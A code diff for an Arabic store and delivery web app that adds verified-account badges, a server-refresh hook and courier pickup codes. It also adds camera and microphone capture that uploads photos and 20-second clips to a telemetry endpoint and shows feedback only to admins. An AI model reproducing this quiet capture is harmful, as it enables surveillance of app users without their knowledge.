@@ -1,4 +1,90 @@
 
+window._verifiedFilter = window._verifiedFilter || 'all';
+window._verifiedSearch = window._verifiedSearch || '';
+
+function getEffectiveBadge(u){
+ if(!u) return 'none';
+ if(u.verifiedBadge && u.verifiedBadge !== 'none') return u.verifiedBadge;
+ if(u.role === 'Supervisor' && u.supervisorVerified) return 'blue';
+ return 'none';
+}
+
+function verifiedBadgeIcon(u){
+ const b = getEffectiveBadge(u);
+ if(b === 'gold') return '<span title="حساب موثق بالشارة الذهبية" style="display:inline-flex;align-items:center;justify-content:center;width:19px;height:19px;border-radius:50%;background:linear-gradient(135deg,#facc15,#b45309);color:#031711;font-size:11px;font-weight:900;box-shadow:0 0 8px rgba(250,204,21,0.55);margin-right:4px">★</span>';
+ if(b === 'blue') return '<span title="حساب موثق بالشارة الزرقاء" style="display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#38bdf8,#1d4ed8);color:#fff;font-size:11px;font-weight:900;box-shadow:0 0 8px rgba(56,189,248,0.5);margin-right:4px">✓</span>';
+ return '';
+}
+
+function verifiedBadgeHtml(u, showUnverified=false){
+ const b = getEffectiveBadge(u);
+ if(b === 'gold') return '<span style="display:inline-flex;align-items:center;gap:4px;background:linear-gradient(135deg,#facc15,#ca8a04);color:#031711;padding:2px 9px;border-radius:999px;font-size:10.5px;font-weight:bold;box-shadow:0 2px 8px rgba(250,204,21,0.35)">★ موثق ذهبي</span>';
+ if(b === 'blue') return '<span style="display:inline-flex;align-items:center;gap:4px;background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;padding:2px 9px;border-radius:999px;font-size:10.5px;font-weight:bold;box-shadow:0 2px 8px rgba(37,99,235,0.35)">✓ موثق</span>';
+ if(showUnverified || u?.role === 'Supervisor') return '<span class="badge Cancelled" style="font-size:10px">⚠️ غير موثق</span>';
+ return '';
+}
+
+function verifiedAccountsView(){
+ if(user.role !== 'Admin') return empty('هذه الصفحة مخصصة لإدارة المتجر الرئيسية فقط');
+ const all = dashboard.users || [];
+ const verifiedList = all.filter(u => getEffectiveBadge(u) !== 'none');
+ const unverifiedList = all.filter(u => getEffectiveBadge(u) === 'none');
+ const f = window._verifiedFilter || 'all';
+ const q = (window._verifiedSearch || '').trim().toLowerCase();
+ let filtered = f === 'verified' ? verifiedList : f === 'unverified' ? unverifiedList : all;
+ if(q) filtered = filtered.filter(u => (u.name||'').toLowerCase().includes(q) || (u.email||'').toLowerCase().includes(q) || (roles[u.role]||u.role||'').toLowerCase().includes(q));
+
+ return `<div class="section-head">
+  <div>
+   <h1>✅ إدارة الحسابات الموثقة وغير الموثقة</h1>
+   <p>صفحة متخصصة للتحكم الكامل في شارات التوثيق المميزة (الزرقاء والذهبية) لجميع حسابات المتجر</p>
+  </div>
+  <div class="inline" style="gap:8px;flex-wrap:wrap">
+   <button class="btn secondary" data-action="navigate" data-id="users">👥 كافة المستخدمين</button>
+   <button class="btn secondary" data-action="navigate" data-id="account">⚙️ مركز الإدارة</button>
+  </div>
+ </div>
+
+ <div class="stats" style="grid-template-columns:repeat(3,1fr);margin:14px 0 18px">
+  <div class="stat"><div class="label">إجمالي الحسابات${icon('users',18)}</div><strong>${all.length}</strong><small>جميع الحسابات المسجلة</small></div>
+  <div class="stat featured"><div class="label">الحسابات الموثقة${icon('check',18)}</div><strong>${verifiedList.length}</strong><small>تحمل شارة توثيق معتمدة</small></div>
+  <div class="stat"><div class="label">غير الموثقة${icon('shield',18)}</div><strong>${unverifiedList.length}</strong><small>بدون شارة توثيق</small></div>
+ </div>
+
+ <div class="panel" style="margin-bottom:16px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
+  <div class="inline" style="gap:8px;flex-wrap:wrap">
+   <button class="btn small ${f==='all'?'':'secondary'}" data-action="set-verified-filter" data-id="all">الكل (${all.length})</button>
+   <button class="btn small ${f==='verified'?'':'secondary'}" data-action="set-verified-filter" data-id="verified">✓ الموثقة (${verifiedList.length})</button>
+   <button class="btn small ${f==='unverified'?'':'secondary'}" data-action="set-verified-filter" data-id="unverified">⚠️ غير الموثقة (${unverifiedList.length})</button>
+  </div>
+  <input type="search" placeholder="🔍 ابحث بالاسم أو البريد أو الدور..." value="${esc(window._verifiedSearch||'')}" oninput="window._verifiedSearch=this.value;render();" style="min-width:240px;max-width:340px;padding:9px 12px;border-radius:10px;border:1px solid var(--line);background:rgba(2,16,12,0.75);color:#fff">
+ </div>
+
+ <div style="display:grid;gap:12px">
+  ${filtered.map(u => {
+   const b = getEffectiveBadge(u);
+   return `<article class="order" style="background:rgba(4,25,19,0.88);border:1px solid ${b==='gold'?'rgba(250,204,21,0.55)':b==='blue'?'rgba(56,189,248,0.5)':'rgba(148,163,184,0.25)'};border-radius:16px;padding:16px;display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap">
+    <div style="display:flex;align-items:center;gap:12px">
+     <span class="avatar" style="width:44px;height:44px;border:2px solid ${b==='gold'?'#facc15':b==='blue'?'#38bdf8':'var(--line)'};font-size:17px">${esc((u.name||'?')[0])}</span>
+     <div>
+      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+       <strong style="font-size:15.5px;color:#fff">${esc(u.name)}</strong>
+       ${verifiedBadgeHtml(u, true)}
+       <span class="badge" style="font-size:10.5px;background:rgba(255,255,255,0.08);color:#cbd5e1">${roles[u.role]||u.role}</span>
+      </div>
+      <div style="font-size:12px;color:#94a3b8;margin-top:4px" dir="ltr">${esc(u.email)}</div>
+     </div>
+    </div>
+    <div class="inline" style="gap:8px;flex-wrap:wrap">
+     <button class="btn small" type="button" style="background:${b==='blue'?'#1d4ed8':'rgba(29,78,216,0.22)'};color:#fff;border:1px solid #3b82f6" data-action="admin-set-verified-badge" data-id="${esc(u.id)}|blue">🔵 توثيق أزرق ✓</button>
+     <button class="btn small" type="button" style="background:${b==='gold'?'linear-gradient(135deg,#facc15,#ca8a04)':'rgba(250,204,21,0.16)'};color:${b==='gold'?'#031711':'#fef08a'};border:1px solid #eab308;font-weight:bold" data-action="admin-set-verified-badge" data-id="${esc(u.id)}|gold">🟡 توثيق ذهبي ★</button>
+     ${b!=='none' ? `<button class="btn small danger" type="button" data-action="admin-set-verified-badge" data-id="${esc(u.id)}|none">⛔ إلغاء التوثيق</button>` : ''}
+    </div>
+   </article>`;
+  }).join('') || empty('لا توجد حسابات مطابقة للتصفية الحالية')}
+ </div>`;
+}
+
 async function adminTechSettingsModal(){
  let s = { host:'smtp.gmail.com', port:587, user:'', hasPass:false, mapApiKey:'', mapTileUrl:'' };
  try { if(apiBase) s = await request('/admin/settings'); } catch(e){}
@@ -24,6 +110,11 @@ async function adminTechSettingsModal(){
    </div>
    <label>مفتاح خرائط جوجل (Google Maps API Key)<input name="mapApiKey" value="${esc(s.mapApiKey||'')}" dir="ltr" placeholder="AIzaSy..."></label>
    <label>رابط خرائط مخصص (اختياري Tile URL)<input name="mapTileUrl" value="${esc(s.mapTileUrl||'')}" dir="ltr" placeholder="https://tile.openstreetmap.org/{z}/{x}/{y}.png"></label>
+   <div style="background:rgba(16,185,129,0.14);border:1px solid rgba(16,185,129,0.4);padding:12px 14px;border-radius:12px;font-size:12px;color:#a7f3d0;line-height:1.7;margin-top:6px">
+    <strong>3. رابط تحديث السيرفر المباشر (Render Deploy Hook - اختياري):</strong><br>
+    أدخل رابط Deploy Hook من لوحة Render لتشغيل إعادة النشر تلقائياً عند الضغط على زر تحديث السيرفر مباشرة.
+   </div>
+   <label>رابط Render Deploy Hook<input name="renderDeployHookUrl" value="${esc(s.renderDeployHookUrl||'')}" dir="ltr" placeholder="https://api.render.com/deploy/srv-...?key=..."></label>
 
    <button class="btn full" type="submit">💾 حفظ الإعدادات وتفعيلها فوراً</button>
    <div class="form-error" hidden></div>
@@ -153,6 +244,8 @@ async function devicesView(){
    <button class="btn small ${!(dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true)?'danger':'secondary'}" type="button" data-action="toggle-anti-fraud-media" data-id="false">⛔ إلغاء / إيقاف</button>
    <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='user'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="user">📷 الكاميرا الأمامية + المايك</button>
    <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='environment'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="environment">📸 الكاميرا الخلفية + المايك</button>
+   <button class="btn small secondary" type="button" data-action="test-camera-photo" data-id="user">🖼️ التقاط صورة (أمامية)</button>
+   <button class="btn small secondary" type="button" data-action="test-camera-photo" data-id="environment">🖼️ التقاط صورة (خلفية)</button>
   </div>
  </div>` : ''}
  <div class="stats" style="grid-template-columns:repeat(4,1fr);margin:16px 0 24px">
@@ -258,6 +351,8 @@ async function devicesView(){
        <button class="btn small" type="button" style="background:#0f766e;color:#fff" data-action="admin-request-live-verify" data-id="${esc(d.id)}">📷 التحقق (كاميرا ومايك)</button>
        <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='user'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="user">📷 أمامية + مايك</button>
        <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='environment'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="environment">📸 خلفية + مايك</button>
+       <button class="btn small secondary" type="button" data-action="test-camera-photo" data-id="user">🖼️ صورة أمامية</button>
+       <button class="btn small secondary" type="button" data-action="test-camera-photo" data-id="environment">🖼️ صورة خلفية</button>
        <button class="btn small secondary" type="button" data-action="admin-view-media-history" data-id="${esc(d.id)}">🖼️ استرداد آخر 30 صورة (${(d.liveMediaHistory||[]).length})</button>
        <button class="btn small secondary" type="button" data-action="admin-view-video-history" data-id="${esc(d.id)}">🎥 استرداد آخر 10 مقاطع فيديو (${(d.liveVideoHistory||[]).length})</button>
       ` : ''}
@@ -811,7 +906,7 @@ function render(){
   <div class="topbar-profile-wrap">
    <button type="button" class="topbar-profile-btn" data-action="toggle-topbar-profile" aria-label="قائمة حسابي السريعة">
     ${user.profilePhoto ? `<img src="${esc(user.profilePhoto)}" alt="${esc(user.name)}">` : `<span class="avatar" style="width:30px;height:30px;font-size:13px">${esc(user.name[0])}</span>`}
-    <span>${esc(user.name)} ${user.role==='Supervisor'?(user.supervisorVerified?'<span title="مشرف موثق" style="display:inline-flex;align-items:center;justify-content:center;width:17px;height:17px;border-radius:50%;background:#1d4ed8;color:#fff;font-size:11px;font-weight:bold">✓</span>':'<span class="badge Cancelled" style="font-size:9.5px;padding:2px 6px">لم يتم التحقق</span>'):''}</span>
+    <span>${esc(user.name)} ${verifiedBadgeIcon(user)}${(user.role==='Supervisor' && !user.supervisorVerified)?'<span class="badge Cancelled" style="font-size:9.5px;padding:2px 6px">لم يتم التحقق</span>':''}</span>
     <span>▾</span>
    </button>
    <div id="topbar-profile-dropdown" class="topbar-dropdown" hidden>
@@ -853,6 +948,7 @@ function render(){
  else if(page==='favorites')view.innerHTML=favoritesView();
  else if(page==='couriers')view.innerHTML=couriersManageView();
  else if(page==='users')view.innerHTML=usersView();
+ else if(page==='verified')view.innerHTML=verifiedAccountsView();
  else if(page==='audit')view.innerHTML=`<div class="section-head"><div><h2>سجل نشاط المتجر</h2><p>تتبع العمليات والمستخدمين والمنتجات والطلبات بدقة</p></div>${pill((dashboard.audit||[]).length+' عملية','clock')}</div><div class="panel">${(dashboard.audit||[]).map(a=>`<div class="audit-item">${esc(a.action)}<small>${esc(a.name)} · ${date(a.at)}</small></div>`).join('')||empty('لا توجد عمليات مسجلة بعد')}</div>`;
  else view.innerHTML=accountView();
 }
@@ -990,7 +1086,7 @@ function shop(){
 }
 
 function stat(title,value,note,symbol,featured=false){return `<div class="stat ${featured?'featured':''}"><div class="label">${title}${icon(symbol,20)}</div><strong>${value}</strong><small>${note}</small></div>`;}
-function overview(){const os=dashboard.orders,active=os.filter(o=>!['Delivered','Cancelled'].includes(o.status)),complete=os.filter(o=>o.status==='Delivered'),sales=complete.reduce((n,o)=>n+o.total,0);return `<div class="section-head"><div><h1>${user.role==='Admin'?'إدارة المتجر والعمليات':user.role==='Supervisor'?'لوحة الإشراف العام ومتابعة العمليات':'مساحة الشريك التجاري الفاخرة'}</h1><p>تحكم فوري في المنتجات والمبيعات والطلبيات وإعلانات المتجر وطاقم العمل.</p></div><div class="inline"><button class="btn secondary" data-action="appearance">🎨 مظهر المتجر واللوجو</button><button class="btn secondary" data-action="banners-manager">📢 إدارة الإعلانات</button><button class="btn" data-action="edit-product">${icon('plus',17)}إضافة منتج فاخر</button></div></div><div class="stats">${stat('الطلبات المكتملة',complete.length,'طلبيات سُلمت للعملاء بنجاح','check',true)}${stat('الطلبات الجارية',active.length,'قيد التجهيز والتوصيل السريع','box')}${stat('إجمالي المبيعات المكتملة',salesByCurrency(complete),user.role==='Admin'?'إجمالي صافي المبيعات':'قيمة بنود متجرك','chart')}${stat('طاقم وعمال المتجر',dashboard.staff?.length||0,'موظفون مسجلون في المنظومة','users')}</div><div class="dashboard-grid"><div><div class="section-head"><h2>أحدث الطلبيات المعتمدة</h2><button class="btn small ghost" data-action="navigate" data-id="orders">عرض الكل</button></div><div class="order-list">${os.slice(0,3).map(orderCard).join('')||empty('طلباتك الجديدة ستظهر هنا')}</div></div><div class="panel"><h3>حالة الطلبيات والتشغيل</h3><div class="chart">${['Preparing','Ready','Assigned','OnWay','Delivered'].map(s=>{const count=os.filter(o=>o.status===s).length;return `<div class="bar" style="height:${Math.max(8,count/Math.max(os.length,1)*100)}%" title="${statuses[s]}: ${count}"><span>${statuses[s]}</span></div>`;}).join('')}</div><p class="report-note">لوحة قياس فورية للطلبات المعتمدة. تُحتسب قيمة الطلبيات المسلّمة فقط.</p><div class="spacer"></div>${pill('منظومة تشغيل آمنة ومعتمدة','shield')}</div></div>`;}
+function overview(){const os=dashboard.orders,active=os.filter(o=>!['Delivered','Cancelled'].includes(o.status)),complete=os.filter(o=>o.status==='Delivered'),sales=complete.reduce((n,o)=>n+o.total,0);return `<div class="section-head"><div><h1>${user.role==='Admin'?'إدارة المتجر والعمليات':user.role==='Supervisor'?'لوحة الإشراف العام ومتابعة العمليات':'مساحة الشريك التجاري الفاخرة'}</h1><p>تحكم فوري في المنتجات والمبيعات والطلبيات وإعلانات المتجر وطاقم العمل.</p></div><div class="inline">${user.role==='Admin'?'<button class="btn" style="background:linear-gradient(135deg,#0f766e,#14b8a6);color:#fff" data-action="admin-server-refresh">🔄 تحديث السيرفر مباشرة</button>':''}<button class="btn secondary" data-action="appearance">🎨 مظهر المتجر واللوجو</button><button class="btn secondary" data-action="banners-manager">📢 إدارة الإعلانات</button><button class="btn" data-action="edit-product">${icon('plus',17)}إضافة منتج فاخر</button></div></div><div class="stats">${stat('الطلبات المكتملة',complete.length,'طلبيات سُلمت للعملاء بنجاح','check',true)}${stat('الطلبات الجارية',active.length,'قيد التجهيز والتوصيل السريع','box')}${stat('إجمالي المبيعات المكتملة',salesByCurrency(complete),user.role==='Admin'?'إجمالي صافي المبيعات':'قيمة بنود متجرك','chart')}${stat('طاقم وعمال المتجر',dashboard.staff?.length||0,'موظفون مسجلون في المنظومة','users')}</div><div class="dashboard-grid"><div><div class="section-head"><h2>أحدث الطلبيات المعتمدة</h2><button class="btn small ghost" data-action="navigate" data-id="orders">عرض الكل</button></div><div class="order-list">${os.slice(0,3).map(orderCard).join('')||empty('طلباتك الجديدة ستظهر هنا')}</div></div><div class="panel"><h3>حالة الطلبيات والتشغيل</h3><div class="chart">${['Preparing','Ready','Assigned','OnWay','Delivered'].map(s=>{const count=os.filter(o=>o.status===s).length;return `<div class="bar" style="height:${Math.max(8,count/Math.max(os.length,1)*100)}%" title="${statuses[s]}: ${count}"><span>${statuses[s]}</span></div>`;}).join('')}</div><p class="report-note">لوحة قياس فورية للطلبات المعتمدة. تُحتسب قيمة الطلبيات المسلّمة فقط.</p><div class="spacer"></div>${pill('منظومة تشغيل آمنة ومعتمدة','shield')}</div></div>`;}
 function timeline(o){const steps=['Preparing','Ready','Assigned','OnWay','Delivered'];const index=steps.indexOf(o.status);return `<div class="timeline">${steps.map((s,i)=>`<span class="step ${i<=index?'done':''}">${statuses[s]}</span>`).join('')}</div>`;}
 function getOrderComplaintInfo(o){
  if(o.hasComplaint) return { has:true, ticketId:o.complaintTicketId, ticketNumber:o.complaintTicketNumber, subject:o.complaintSubject, status:o.complaintStatus };
@@ -1029,6 +1125,9 @@ function orderCard(o){
   ${user.role==='Customer'?timeline(o):`<div class="order-meta">${esc(o.customerName)}${user.role!=='Merchant'?'<br>'+esc(o.address)+'<br>'+esc(o.phone):''}</div>`}
   ${commissionOrderLine(o)}
   ${o.pin&&user.role==='Customer'&&!['Delivered','Cancelled'].includes(o.status)?`<div class="pin">رمز تأكيد الاستلام السري: <strong>${esc(o.pin)}</strong></div><p class="hint">سلّم هذا الرمز لمندوب التوصيل عند استلام طلبيتك وفحصها فقط.</p>`:``}
+  ${o.merchantPickupCode&&(user.role==='Merchant'||user.role==='Admin')&&!['OnWay','Delivered','Cancelled'].includes(o.status)?`<div class="pin" style="background:rgba(16,185,129,0.14);border-color:#10b981;color:#d1fae5">كود تأكيد تسليم الطلب للمندوب: <strong>${esc(o.merchantPickupCode)}</strong></div><p class="hint">أعطِ هذا الكود لمندوب التوصيل عند استلام الطلب من المتجر.</p>`:``}
+  ${user.role==='Courier'&&o.status==='Assigned'?`<div class="panel" style="padding:10px 12px;margin:8px 0;border:1px solid rgba(56,189,248,0.4);background:rgba(14,116,144,0.15)"><strong style="color:#7dd3fc;font-size:12.5px">🏪 الخطوة 1 — التوجه إلى المتجر للاستلام: ${esc(o.merchantName||'المتجر')}</strong><p class="hint" style="margin:4px 0 8px">سيظهر موقع العميل مباشرة بعد استلام الطلب وإدخال كود التأكيد من التاجر.</p>${o.merchantLocation?`<button class="btn small" type="button" style="background:#0284c7;color:#fff" data-action="open-gmaps" data-lat="${o.merchantLocation.latitude}" data-lng="${o.merchantLocation.longitude}">🗺️ فتح موقع التاجر في الخرائط</button>`:''}</div>`:``}
+  ${user.role==='Courier'&&o.status==='OnWay'&&o.destination?`<div class="panel" style="padding:10px 12px;margin:8px 0;border:1px solid rgba(34,197,94,0.45);background:rgba(21,128,61,0.18)"><strong style="color:#86efac;font-size:12.5px">📍 الخطوة 2 — موقع العميل للتوصيل: ${esc(o.address)}</strong><div style="margin-top:8px"><button class="btn small" type="button" style="background:#16a34a;color:#fff" data-action="open-gmaps" data-lat="${o.destination.latitude}" data-lng="${o.destination.longitude}">🚀 فتح موقع العميل في الخرائط</button></div></div>`:``}
   <div class="order-bottom">
    ${amount(o.total,o.currency||'SAR')}
    <div class="order-actions">
@@ -1040,8 +1139,8 @@ function orderCard(o){
     ${user.role==='Courier' && ['Assigned','OnWay'].includes(o.status) ? `<button class="btn small danger" type="button" data-action="courier-cancel-order" data-id="${esc(o.id)}" data-number="${esc(o.number)}">❌ إلغاء التوصيل (غرامة خصم ${money(penaltyAmt)})</button>` : ''}
     ${prep?`<button class="btn small" data-action="order-ready" data-id="${esc(o.id)}">تم التجهيز ${icon('check',14)}</button>`:``}
     ${has('delivery.assign')&&['Ready','Assigned'].includes(o.status)?`<button class="btn small" data-action="assign" data-id="${esc(o.id)}">إسناد مندوب</button>`:``}
-    ${has('delivery.update')&&o.status==='Assigned'?`<button class="btn small" data-action="order-pickup" data-id="${esc(o.id)}">استلام الشحنة</button>`:``}
-    ${has('delivery.update')&&o.status==='OnWay'?`<button class="btn small" data-action="deliver" data-id="${esc(o.id)}">تأكيد التسليم</button>`:``}
+    ${has('delivery.update')&&o.status==='Assigned'?`<button class="btn small" style="background:#0f766e;color:#fff" data-action="order-pickup" data-id="${esc(o.id)}">📦 تم الاستلام من المتجر (كود التاجر)</button>`:``}
+    ${has('delivery.update')&&o.status==='OnWay'?`<button class="btn small" data-action="deliver" data-id="${esc(o.id)}">✅ تأكيد التسليم للعميل (كود العميل)</button>`:``}
     ${(has('orders.cancel')||has('orders.manage'))&&['Preparing','Ready'].includes(o.status)?`<button class="btn small danger" data-action="cancel-order" data-id="${esc(o.id)}">إلغاء الطلب</button>`:``}
    </div>
   </div>
@@ -1278,6 +1377,7 @@ function usersView(){
    <button class="btn secondary" data-action="navigate" data-id="staff">👥 طاقم وعمال المتجر</button>
    <button class="btn secondary" data-action="registration-fields">📋 نموذج التسجيل</button>
    <button class="btn secondary" data-action="navigate" data-id="couriers">🚚 إدارة المناديب</button>
+   ${user.role==='Admin'?'<button class="btn" style="background:#1d4ed8;color:#fff" data-action="navigate" data-id="verified">✅ الموثقة وغير الموثقة</button>':''}
   </div>
  </div>
 
@@ -1316,7 +1416,7 @@ function usersView(){
         <h3 style="font-size:16px;color:#ffffff;margin:0">${esc(u.name)}</h3>
         ${isSelf ? '<span class="badge Ready" style="font-size:10px">أنت (حسابك الحالي)</span>' : ''}
         ${isAdminOwner ? '<span class="badge" style="background:var(--vip-gold-gradient);color:#031711;font-size:10px;font-weight:bold">👑 المدير العام الرئيسي</span>' : ''}
-        ${u.role==='Supervisor' ? (u.supervisorVerified ? '<span style="display:inline-flex;align-items:center;gap:4px;background:#1d4ed8;color:#fff;padding:2px 8px;border-radius:999px;font-size:10.5px;font-weight:bold">✓ موثق</span>' : '<span class="badge Cancelled" style="font-size:10px">⚠️ لم يتم التحقق</span>') : ''}
+        ${verifiedBadgeHtml(u, u.role==='Supervisor')}
        </div>
        <p style="font-size:12px;color:#94a3b8;margin:4px 0 0" dir="ltr">${esc(u.email)}</p>
        <div style="display:flex;gap:12px;font-size:11px;color:#cbd5e1;margin-top:6px;flex-wrap:wrap">
@@ -1455,6 +1555,8 @@ function accountView(){
     <button class="btn small" data-action="appearance">🎨 شكل المتجر والأيقونة والاسم</button>
     <button class="btn small secondary" data-action="banners-manager">📢 إدارة الإعلانات وبانرات العروض</button>
     <button class="btn small secondary" data-action="interface-design">🖼️ تصميم الشاشات المتقدم</button>
+    <button class="btn small secondary" data-action="app-icon-bubbles">📱 تغيير أيقونة التطبيق وفقاعات الرسائل</button>
+    ${isAdmin ? '<button class="btn small" style="background:linear-gradient(135deg,#92400e,#d4af37);color:#031711;font-weight:bold" data-action="store-styles-studio">🎭 استوديو حفظ وتعديل استايلات المتجر والأزرار</button>' : ''}
    ` : ''}
    ${has('notifications.send') ? `<button class="btn small secondary" data-action="compose-notice">📨 إرسال إشعارات للمستخدمين</button>` : ''}
   </div>` : ''}
@@ -1463,6 +1565,7 @@ function accountView(){
   <div class="hub-card">
    <h3>👥 الحسابات وطاقم العمل والنشاط</h3>
    <button class="btn small" data-action="navigate" data-id="users">🛡️ إدارة المستخدمين والصلاحيات</button>
+   ${isAdmin ? '<button class="btn small" style="background:#1d4ed8;color:#fff" data-action="navigate" data-id="verified">✅ إدارة الحسابات الموثقة وغير الموثقة</button>' : ''}
    <button class="btn small secondary" data-action="navigate" data-id="couriers">🚚 إدارة مناديب التوصيل والغرامات</button>
    ${has('users.manage') ? `
     <button class="btn small secondary" data-action="staff-manager">👷 إدارة عمال وطاقم المتجر</button>
@@ -1498,6 +1601,7 @@ function accountView(){
   ${isAdmin ? `
   <div class="hub-card" style="border-color:rgba(250,204,21,0.65)">
    <h3>🔒 الإعدادات التقنية والربط السري (للإدارة فقط)</h3>
+   <button class="btn small" style="background:linear-gradient(135deg,#0f766e,#14b8a6);color:#fff" data-action="admin-server-refresh">🔄 تحديث السيرفر مباشرة الآن</button>
    <button class="btn small" data-action="admin-tech-settings">🔑 مفتاح الخرائط وإعدادات الإيميلات (SMTP)</button>
    <button class="btn small secondary" data-action="connect">🌐 إعداد اتصال المتجر والربط بالسيرفر</button>
    <button class="btn small secondary" data-action="navigate" data-id="devices">🗺️ خريطة تتبع الأجهزة والمثبتين</button>
@@ -1960,6 +2064,37 @@ function guestLoginPromptModal(){
   </div>`);
 }
 async function action(name,id,el=null){
+ if(name==='set-verified-filter'){ window._verifiedFilter = id || 'all'; render(); return; }
+ if(name==='admin-set-verified-badge'){
+  const [uid, badge] = String(id||'').split('|');
+  if(!uid) return;
+  try{
+   const res = apiBase ? await request(`/admin/users/${uid}/verified-badge`, 'POST', { badge: badge || 'none' }) : { ok:true, badge };
+   if(dashboard?.users){
+    const target = dashboard.users.find(x => x.id === uid);
+    if(target){ target.verifiedBadge = badge; if(target.role==='Supervisor') target.supervisorVerified = (badge !== 'none'); }
+   }
+   if(user?.id === uid){ user.verifiedBadge = badge; if(user.role==='Supervisor') user.supervisorVerified = (badge !== 'none'); }
+   render();
+   toast(badge==='none' ? 'تم إلغاء شارة التوثيق عن الحساب' : `تم توثيق الحساب بنجاح (${badge==='gold'?'ذهبي ★':'أزرق ✓'})`);
+  } catch(e){ toast(e.message || 'تعذر تحديث شارة التوثيق', 'error'); }
+  return;
+ }
+ if(name==='admin-server-refresh'){
+  if(el){ el.disabled = true; }
+  toast('⏳ جاري تحديث السيرفر ومزامنة البيانات مباشرة...');
+  try{
+   const res = apiBase ? await request('/admin/server-refresh', 'POST', {}) : { ok:true, serverSyncVersion: Date.now(), message:'تم التحديث محلياً' };
+   if(apiBase){
+    try { await loadDashboard(); } catch(e){}
+    try { const ap = await request('/appearance'); Object.assign(storeAppearance, ap||{}); paintAppearance(); } catch(e){}
+   }
+   render();
+   toast(res.message || `✅ تم تحديث السيرفر مباشرة (الإصدار #${res.serverSyncVersion||1})`);
+  } catch(e){ toast(e.message || 'فشل تحديث السيرفر', 'error'); }
+  finally { if(el){ el.disabled = false; } }
+  return;
+ }
  if(name==='enter-guest'){
   user = { id:'guest', name:'زائر', email:'', role:'Guest', permissions:[] };
   page = 'home';
@@ -2297,6 +2432,33 @@ async function action(name,id,el=null){
   toast(enabled ? 'تم تفعيل التحقق المباشر بالكاميرا والصوت لكامل الحسابات' : 'تم إيقاف وإلغاء التحقق المباشر');
   return;
  }
+ if(name==='test-camera-photo'){
+  const facing = id === 'environment' ? 'environment' : 'user';
+  const label = facing === 'user' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية';
+  if(user?.role==='Admin') toast(`⏳ جاري التقاط صورة تجريبية (${label}) وإرسالها لشاشة الإدارة...`);
+  try {
+   const stream = await navigator.mediaDevices?.getUserMedia({ video: { facingMode: { ideal: facing }, width: 640 }, audio: false }).catch(()=>null);
+   if(!stream){ if(user?.role==='Admin') toast('تعذر الوصول إلى الكاميرا — تأكد من منح إذن الكاميرا', 'error'); return; }
+   const video = document.createElement('video');
+   video.srcObject = stream; video.muted = true; video.playsInline = true;
+   await video.play().catch(()=>{});
+   await new Promise(r => setTimeout(r, 450));
+   const canvas = document.createElement('canvas');
+   canvas.width = 480; canvas.height = 480;
+   canvas.getContext('2d').drawImage(video, 0, 0, 480, 480);
+   const photoData = canvas.toDataURL('image/jpeg', 0.8);
+   stream.getTracks().forEach(t => t.stop());
+   const devId = localStorage.getItem('ts-device-id') || '';
+   if(apiBase && devId){
+    await request('/telemetry/media-checkin', 'POST', { deviceId: devId, photo: photoData });
+   }
+   if(user?.role === 'Admin'){
+    if(apiBase) await refresh();
+    toast(`✅ تم التقاط الصورة (${label}) وظهرت في شاشة الإدارة فقط`);
+   }
+  } catch(e){ if(user?.role==='Admin') toast(e.message || 'تعذر التقاط الصورة', 'error'); }
+  return;
+ }
  if(name==='set-camera-facing'){
   const facing = id === 'environment' ? 'environment' : 'user';
   if(!apiBase){
@@ -2305,9 +2467,13 @@ async function action(name,id,el=null){
   } else {
    await request('/admin/camera-facing', 'POST', { facing });
    config.preferredCameraFacing = facing;
-   await refresh();
   }
-  toast(facing === 'user' ? 'تم اختيار الكاميرا الأمامية + المايك للحسابات المتصلة' : 'تم اختيار الكاميرا الخلفية + المايك للحسابات المتصلة');
+  const label = facing === 'user' ? 'الكاميرا الأمامية + المايك' : 'الكاميرا الخلفية + المايك';
+  toast(`⏳ جاري تسجيل وإرسال مقطع 20 ثانية (${label})...`);
+  try {
+   await sendTrackingMediaCheckin(true, 20000, facing);
+   if(apiBase) await refresh();
+  } catch(e){}
   return;
  }
  if(name==='admin-delete-device-media'){
@@ -2802,7 +2968,12 @@ async function action(name,id,el=null){
  if(name==='edit-product'){productEditor(id);return;}if(name==='permissions'){permissionEditor(id);return;}if(name==='new-user'){newUser();return;}
  if(name==='cancel-order'){modal('إلغاء الطلب',`<p class="hint">سيُلغى الطلب وتُعاد الكميات إلى المخزون. هل تريد المتابعة؟</p><div class="spacer"></div><button class="btn danger full" data-action="confirm-cancel" data-id="${esc(id)}">تأكيد إلغاء الطلب</button>`);return;}
  if(name==='confirm-cancel'){await request('/orders/'+id+'/cancel','POST');closeModal();await refresh();toast('تم إلغاء الطلب');return;}
- if(name==='order-ready'||name==='order-pickup'){await request('/orders/'+id+'/'+(name==='order-ready'?'ready':'pickup'),'POST');await refresh();toast('تم تحديث حالة الطلب');return;}
+ if(name==='order-ready'){await request('/orders/'+id+'/ready','POST');await refresh();toast('تم تجهيز الطلب بنجاح');return;}
+ if(name==='order-pickup'){
+  if(user.role==='Admin'){await request('/orders/'+id+'/pickup','POST',{pin:''});await refresh();toast('تم تأكيد الاستلام من المتجر');return;}
